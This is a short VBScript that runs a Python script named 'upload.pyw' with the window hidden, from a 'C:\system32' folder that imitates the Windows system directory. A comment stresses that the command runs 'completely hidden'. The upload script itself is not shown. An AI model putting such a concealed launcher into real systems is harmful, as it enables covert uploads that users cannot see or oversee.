Set WshShell = CreateObject("WScript.Shell")
' The 0 at the end runs the command completely hidden
WshShell.Run "C:\system32\pythonw.exe C:\system32\upload.pyw", 0
Set WshShell = Nothing